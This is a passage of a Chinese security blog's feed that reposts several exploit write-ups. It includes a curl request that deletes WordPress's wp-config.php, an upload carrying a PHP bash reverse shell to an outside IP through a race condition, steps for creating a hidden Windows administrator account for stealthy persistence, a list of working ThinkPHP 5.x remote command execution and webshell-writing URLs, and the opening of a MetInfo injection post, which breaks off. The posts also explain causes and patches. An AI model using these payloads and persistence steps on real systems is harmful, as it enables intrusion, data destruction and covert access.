alt></p><p>这里讲一下乌云的一个案例，具体链接忘记了，就讲一下思路：</p><p>洞主之前发现了一个漏洞，提交后，等过一段时间再去瞧下那个站，发现系统大变样，连url的路径都改了，已经修复了吗？</p><p>但是当洞主右键查看源代码时，发现还保留着之前旧系统的链接和代码，有的只是注释了而已，关键是漏洞竟然还没修？！tql，这种开发建议直接祭天。</p><p>看js代码，甚至一些图片的链接，说不定就有一番意外的收获。比如R3start大佬的一篇博文中讲的就很精彩从JS信息泄露到Webshell</p><p>文章的思路是：</p><p>作者进行渗透时，在一个图片链接中发现了一个三级子域名，删掉URl、直接访问根路径发现了一个title是某管理平台的页面。</p><p>但页面无法正常加载，故进行目录扫描得到后台地址和后台js压缩包，然后在源码的某处JS代码中发现了多个可登录的账号。</p><p>尝试弱口令无果后，从js压缩包查到了默认密码规则。成功登陆一个普通用户，但发现权限并不大。</p><p>然后通过js代码寻找获取到了别的接口地址，发现存在越权漏洞，通过JS接口越权访问到活动管理页面获取到管理员的登陆账号。</p><p>最后找上传点，抓包改后缀拿shell一气呵成。</p><p>引用R3start师傅的一句话：</p><p>右键查看JS源码，你可能会发现… 被注释的账号密码、接口、token、真实IP、开发环境…. 永远不知道程序员在JS中给你留下了什么样的惊喜。</p><h2 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h2><p>上面的内容比较杂，篇幅也比较长，所以有些地方就没有展开来讲。有些地方可能讲得比较简略模糊，请大家见谅，如果有疑惑可以联系我。</p><p>顺便说下感想：</p><p>这段时间的安服实习对我带来很大的帮助，面对一些系统目标固定，不能横向渗透。C段、端口扫描、子域名挖掘等信息收集都做不了，只能硬着头皮怼目标。而做安全服务经常碰到的就是后台登陆界面，怼着怼着就成长了，毕竟孰能生巧。</p><p>虽然渗透比较艰难，但也培养了我的漏洞挖掘能力。反思下自己以前挖漏洞，都是走马观花，面对信息收集来的一大堆资产，都是随便测下就结束，并没有深入且细心地去寻找漏洞，导致之前的SRC挖掘之旅十分困难。因此希望新手在挖洞时能够更加细心，特别是挖掘SRC时，有时就得花时间一个参数一个参数去”怼”，才能有所收获。要相信，大力出奇迹！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最新版wordpress任意文件删除漏洞复现</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E6%9C%80%E6%96%B0%E7%89%88wordpress%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E6%9C%80%E6%96%B0%E7%89%88wordpress%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在推特上看到了一篇paper，<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">点我啊</a></p><p>wp很久没看到洞了，这个漏洞七个月之前就上报了</p><p><img src="https://www.t00ls.net/attachments/month_1806/1806271941e0c68c6590fb61ce.jpg" alt></p><p>可以直接利用删除图片那个功能删除网站配置文件，导致网站只能重装。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这是我下载的最新版wordpress(4.9.6)</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719418e1d18c525441003.jpg" alt></p><p>登陆后台：</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719417422f20751eeb517.jpg" alt></p><p>上传张图片：</p><p><img src="https://www.t00ls.net/attachments/month_1806/1806271941c262f1600ee929f9.jpg" alt><br><img src="https://www.t00ls.net/attachments/month_1806/18062719417ba7d799ffd03dac.jpg" alt></p><p>然后edit</p><p>发挥一下Curl的作用。<br>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://192.168.19.129/wordpress/wp-admin/post.php?post=7&apos; -H &apos;Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7C099559ea1580b258b82765641ac85a51576507c8c3ebb8e131b20c9eec8f65bc; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7Cba9defabde03b6acdb4a5c43fc39244efbec15913483ae43ff0b624be552f5a4; wp-settings-time-1=1530097413&apos; -d &apos;action=editattachment&amp;_wpnonce=28380b3d4a&amp;thumb=../../../../wp-config.php&apos;</span><br></pre></td></tr></table></figure><p>这里把里面的cookie和_wpnonce还有post的值换成你的。</p><p>_wpnonce在页面中：</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719416e3066a6bbbff35a.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/180627194156de439440ffd6f8.jpg" alt></p><p>302跳转说明编辑成功。<br><img src="https://www.t00ls.net/attachments/month_1806/1806271941fac9a1bd5595aff2.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719414486ac7e14bbfe0e.jpg" alt></p><p>现在点击Delete Permanently即可。<br><img src="https://www.t00ls.net/attachments/month_1806/18062719410de6e321efa45d83.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719417bd0b5cc4ef818d3.jpg" alt></p><p>配置文件成功删除。</p><p>漏洞原理作者博客上有细节，本意是删除缩略图。但是没有对路径做限制，导致可以任意文件删除。</p><p>作者给的修复代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add_filter( &apos;wp_update_attachment_metadata&apos;, &apos;rips_unlink_tempfix&apos; );</span><br><span class="line"></span><br><span class="line">function rips_unlink_tempfix( $data ) &#123;</span><br><span class="line">    if( isset($data[&apos;thumb&apos;]) ) &#123;</span><br><span class="line">        $data[&apos;thumb&apos;] = basename($data[&apos;thumb&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Sakura"><a href="#Sakura" class="headerlink" title="Sakura"></a>Sakura</h2><p>鸡肋之处在于需要管理员权限，但是危害蛮大的。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用竞争条件（Race Condition）对目标Web应用实现RCE</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%EF%BC%88Race%20Condition%EF%BC%89%E5%AF%B9%E7%9B%AE%E6%A0%87Web%E5%BA%94%E7%94%A8%E5%AE%9E%E7%8E%B0RCE/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%EF%BC%88Race%20Condition%EF%BC%89%E5%AF%B9%E7%9B%AE%E6%A0%87Web%E5%BA%94%E7%94%A8%E5%AE%9E%E7%8E%B0RCE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20190927/1569574102_5d8dccd6280d4.jpeg" alt><br><strong>本文讲述了作者在某邀请测试项目中，通过对SQL注入和竞争条件（Race Condition）的组合利用，利用上传文件到服务器和服务器转移上传文件到Amazon S3的时间差，最终实现了对目标应用的RCE漏洞。由于该RCE漏洞的发现相对独特，所以作者在本文中着重从竞争条件（Race Condition）的触发机制说起，和大家分享。</strong></p><p>竞争条件（Race Condition）：计算机运行过程中，并发、无序、大量的进程在使用有限、独占、不可抢占的资源，由于进程无限，资源有限，产生矛盾，这种矛盾称为竞争（Race）。竞争条件（Race Condition）旨在描述一个系统或者进程的输出依赖于不受控制的事件出现顺序或者出现时机。由于两个或者多个进程竞争使用不能被同时访问的资源，使得这些进程有可能因为时间上推进的先后原因而出现问题。</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><strong>第一个上传功能点upload.php</strong><br>这里的前提是，我已经通过SQL注入获取到了目标Web应用的管理员账户凭据，然后登录到其内部管理界面后，我发现可通过该管理面板中的upload.php功能发布新闻或文章：<br><img src="https://image.3001.net/images/20190927/1569573792_5d8dcba09f119.png" alt></p><p>没做太多考虑，我就直接通过upload.php尝试上传了一个.php文件shell，但问题是该上传功能限制了对.php格式文件的上传，在变化.PhP、.php3、phpphp、空字符等形式的绕过方法后，还是不行：</p><p><img src="https://image.3001.net/images/20190927/1569573819_5d8dcbbb2d374.png" alt></p><p>然后，我想到了存储型XSS，能不能通过上传 .html、.xml或.svg格式文件呢？这一下上传总算成功了，但是，由于目标Web应用又会把用户上传文件转储到云端的S3存储桶中去，那在S3存储桶触发XSS也没意义了。好吧，那暂时把这个问题放一边，来看其它的。</p><p><strong>第二个上传功能点modify.php</strong><br>在没有头绪之时，我又返回管理面板中“news”栏目，想看看能不能在添加或编辑操作中发现可利用的点。此时，我注意到了“edit”功能，如下在这个非法上传文件右上端，我点击了其“edit”按钮：<br><img src="https://image.3001.net/images/20190927/1569573846_5d8dcbd6be03b.png" alt></p><p>然后跳出了以下包含upload to replacing the file的窗口：</p><p><img src="https://image.3001.net/images/20190927/1569573860_5d8dcbe4d0c4f.png" alt></p><p>我想到的是，它可能也是包含了限制过滤条件吧，但事实是，它没有任何后缀格式限制条件！可以上传任意文件！那就上传吧，如果没有限制条件的话，那它调用的应该不是之前的upload.php，确实是，它调用了另一上传功能点“modify.php”，以下是它的调用请求格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;fileid&quot;</span><br><span class="line"></span><br><span class="line">31337</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">picture-1.png</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;reverse.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">exec(&quot;/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.20.30.40/21234 0&gt;&amp;1&apos;&quot;);</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;save&quot;</span><br><span class="line"></span><br><span class="line">Save</span><br></pre></td></tr></table></figure><p>大功告成了吗？并没有。目标Web应用之后还会把用户上传文件转储上传到云端S3存储桶中去，也就是说，如果被传到S3中去，在目标Web应用的服务器中，我们也没shell可反弹了。</p><p>竞争条件（Race Condition）响应错误获得本地文件路径</p><p>此时，毫无头绪之际，我通过burpsuite的 intruder 模式上传操作中，发现了响应长度的异常。有时候需要发起10个左右的请求，有时候则需要发起20–30个请求，才会出现这样的响应异常。正常来说，多数请求的响应长度为1147，但奇怪的是，在其中，会夹杂着长度为1710的响应。如多次上传空内容的rc.php，其请求样式为：</p><p><img src="https://image.3001.net/images/20190927/1569573928_5d8dcc28ae8c9.png" alt></p><p>以下是正常的长度为1147的响应：<br><img src="https://image.3001.net/images/20190929/15697498189460.png" alt></p><p>以下则是异常的长度为1710的响应，其中竟然返回了我们上传的php文件的本地路径：<br><img src="https://image.3001.net/images/20190929/15697498457248.png" alt></p><p>本想着，有了这个路径，那么完全就可以实现监听反弹了，但其实不然。当我通过浏览器访问该上传php文件后，Web应用返回了“File not Found”的提示，经再次检查后发现，该文件路径已经对应成了S3存储桶的路径了，所以，因此我猜测，我们的上传文件被目标Web应用移动到云端S3之前，在Web应用服务器中保存的时间大概会是短暂的1到2秒。</p><h4 id="用竞争条件（Race-Condition）反弹Shell并实现RCE"><a href="#用竞争条件（Race-Condition）反弹Shell并实现RCE" class="headerlink" title="用竞争条件（Race Condition）反弹Shell并实现RCE"></a>用竞争条件（Race Condition）反弹Shell并实现RCE</h4><p>根据以上的时间猜测，我就有一个想法：如果我们从客户端来触发竞争条件，通过浏览器反复请求上传文件路径，以此来争取对其的访问占有权限，这样的做法是否可行？</p><p>也就是：</p><p>在我们shell反弹服务器中设置端口监听 -&gt; 上传我们的反弹shell文件 -&gt; 发起多个请求执行竞争条件 -&gt; 获取长度异常的响应 -&gt; 从中获取上传shell文件路径并用浏览器访问并不断刷新（CTRL+R） -&gt; 以这种方式再次让目标Web应用处于竞争条件下, 我们就占有了对上传shell文件的继续访问权。</p><p>一试，果然行。以下是触发反弹shell实现RCE的竞争条件逻辑图：</p><p><img src="https://image.3001.net/images/20190927/1569574004_5d8dcc748d90b.png" alt></p><p>nc端监听返回的RCE结果：<br><img src="https://image.3001.net/images/20190927/1569574019_5d8dcc8375cc9.png" alt></p><h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><p>在上传文件本身被转移到云端S3存储桶之前，我们有可能获得上传文件的本地路径。哪怕只有1或2秒，就足以触发上传shell的成功反弹；</p><p>可多对上传或编辑功能点进行分析，如果它们是独立的调用，那么则需要比较它们可具体实现的操作。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows创建隐藏用户</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<p>在渗透Windows时当我们可以任意命令执行时就需要创建一个账号，然后再进行深入的渗透，为了保证渗透的隐蔽性和持久性，创建一个隐藏用户就是一个常用、基础且非常重要的技能。</p><p>为什么不直接抓admin的密码呢？因为我之前对某目标做渗透时吃了次亏，在正常的使用MSF抓密码的过程中不知道对哪里造成了损害，导致目标的admin密码被销毁，然后就登录不上……当然，抓admin的密码并登录也是可以收获很多有用的东西的，说不定桌面就放了一份密码表，但这要在已经成功创建好一个隐藏账号的前提下进行。</p><p>首先创建一个账号，Windows下以”$”结尾的就是一个隐藏账号，然后将这个账号添加入Admin组中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user wuyou$ 123456 /add</span><br><span class="line">net localgroup administrators wuyou$ /add</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/1.png" alt></p><p>如上图，使用”net user”查看时没有新创建的”wuyou$”用户<br>但是，在 计算机管理 -&gt; 本地用户和组 中还是可以找到这个隐藏账号<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/2.png" alt></p><p>所以说我们现在创建的这个隐藏账号的隐蔽性还不够高，还需要再进行一步操作。<br>打开注册表，找到下面这个位置<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/3.png" alt>.png</p><p>由于SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限（右键，然后点击权限，给予完全控制权限后重新打开注册表）<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/4.png" alt></p><p>可以看到000001F4对应admin账号（随机生成一个十六进制来对应账号的name）<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/5.png" alt></p><p>然后将注册表导出<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/6.png" alt></p><p>将隐藏账号的F键的值替换成admin的F键的值<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/7.png" alt></p><p>然后在cmd下删除之前创建的隐藏账号<br>net user wuyou$ /del<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/8.png" alt></p><p>然后双击执行我们之前导出并修改了的注册表文件<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/9.png" alt></p><p> 可以看到这个账号已成功添加入注册表中</p><p>但是在本地用户和组中找不到<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/10.png" alt></p><p>而且可以进行远程桌面连接<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/11.png" alt></p><p>当然，这种隐藏账号在注册表中是可以找到的，当我们想要删除这个隐藏账号时就需要从注册表下手了。</p><p>下面是在 Windows 10 中打开注册表编辑器的两种方法：<br>1.在任务栏上的搜索框中，键入“regedit”。然后，选择注册表编辑器（桌面应用）最上面的结果。<br>2.长按或右键单击“开始”按钮，然后依次选择“运行”。在打开：框中输入“regedit”，选择“确定”。</p><p><strong>转载于</strong>：<a href="http://zone.secevery.com/article/1110" target="_blank" rel="noopener">http://zone.secevery.com/article/1110</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.x 路由缺陷导致远程代码执行</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/ThinkPHP5.x%20%E8%B7%AF%E7%94%B1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/ThinkPHP5.x%20%E8%B7%AF%E7%94%B1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ThinkPHP是一套国内流行的开源PHP MVC开发框架，其中存在3.x和5.x两个版本，目前3.x已停止维护，5.x为15年正式推出的，基本上对3.x进行了重构，针对于路由，也舍弃了默认的方式，正是因为新的路由存在缺陷，导致任意函数的调用。</p><h2 id="知识背景"><a href="#知识背景" class="headerlink" title="知识背景"></a>知识背景</h2><p>路由解析<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.jpg" alt></p><p>?s=index/index/hello</p><p>tp5中路由舍弃了3.x中的<strong>?m=index&amp;c=Index&amp;a=hello</strong>方式，而使用一个参数<strong>s</strong>传递所有信息，<strong>s=/index/Index/hello</strong>中三部分分别代表<strong>module,controller,action</strong>。此次出现问题的部分便是<strong>controller</strong>，由于<strong>ThinkPHP</strong>中命名空间和自动加载的作用，每个类都可被访问到，即导致每个类都可被当做<strong>controller</strong>。</p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fy562obz8cj31dm0gg0vy.jpg" alt></p><p><strong>参数处理</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public function index($name)&#123;</span><br><span class="line">        return &apos;Hello &apos;+$name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>?s=index/test/index&amp;name=world</code></p><p>参数会自动处理，当然也可为数组，比如</p><p><code>?s=index/test/index&amp;name[0]=world&amp;&amp;name[1]=xx</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.jpg" alt><br>在5.1.x中函数名为<strong>parseModuleAndClass</strong>，功能一样</p><p><strong>parseClass()</strong>函数：</p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.jpg" alt></p><p>正常情况下会对<strong>name</strong>进行处理，限制在<strong>app\index\controller</strong>命名空间。</p><p>这里的<strong>name即为controller</strong>，前置处理为获取到<strong>module,controller,action</strong>，将<strong>controller</strong>传入该函数处理。</p><p><strong>当name中存在\时，直接将name赋值到class，不再进行parseClass操作，配合自动加载的机制从而导致可为任意命名空间下的类作为controller，任意public都可被用户访问到，结合ThinkPHP5内置的一些类和方法便可造成远程命令执行。</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>thinkphp/library/think/App.php 304-320行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 执行函数或者闭包方法 支持参数调用</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string|array|\Closure $function 函数或者闭包</span><br><span class="line"> * @param array                 $vars     变量</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">public static function invokeFunction($function, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    $reflect = new \ReflectionFunction($function);</span><br><span class="line">    $args    = self::bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    // 记录执行信息</span><br><span class="line">    self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;__toString(), &apos;info&apos;);</span><br><span class="line"></span><br><span class="line">    return $reflect-&gt;invokeArgs($args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?s=index/think\app/invokefunction/function/call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p><p>ReflectionFunction为PHP中的反射类，反射调用call_user_func_array，call_user_func_array为回调函数，回调system，参数为id</p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.jpg" alt></p><p>已知POC(来自t00ls)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">2、?s=index/\think\Request/input&amp;filter=system&amp;data=id</span><br><span class="line">3、?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">4、?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">5、?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">6、?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">7、?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">8、?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.jpg" alt></p><p>该补丁为<strong>5.0.x</strong>补丁，<strong>5.1.x</strong>位置不一样，方式一样。</p><p>补丁方式为限制<strong>controller</strong>只能为字母和数字。并且放在<strong>controller</strong>处理之前。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单来说这个洞是由于用户控制了<strong>controller导致的，开发者将处理controller的代码封装到了Loader.php，并且与其他功能进行代码复用，为了满足其他功能增加的功能(即特殊处理存在\的参数)，从而导致了漏洞。代码复用是开发者优质的习惯，但也需要严格审核是否因为书写复用代码时是否会造成漏洞。</strong></p><p>另外，可以看到这是一个非常浅显的洞，至今没有人发现，最终由官方爆出，也许很多用户默认此开源框架“流行 == 安全”，其实很多应用并不是想象中的完全安全，漏洞经常发生在被人忽视的地方。</p><p>转载于：<a href="https://p0sec.net/index.php/archives/125/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/125/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>metinfo 6.2.0最新版本前台注入漏洞</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/metinfo%206.2.0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/metinfo%206.2.0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>metinfo 6.2.0最新版本前台注入漏洞<br><a href="https://nosec.org/home/detail/2436.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2436.html</a><br><a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a></p><h2 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h2><p>docker pull zksmile/vul:metinfov6.2.0</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述:"></a>概述:</h2><p>看到某个表哥发的metinfo 6.1.3最新注入（<a href="https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。</a></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>前台，（<a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a> ）作者在这里说需要注册会员，其实有一处不需要。漏洞详情<br>这里关键点在auth类的encode()和decode()方法。看下代码：<br><figure 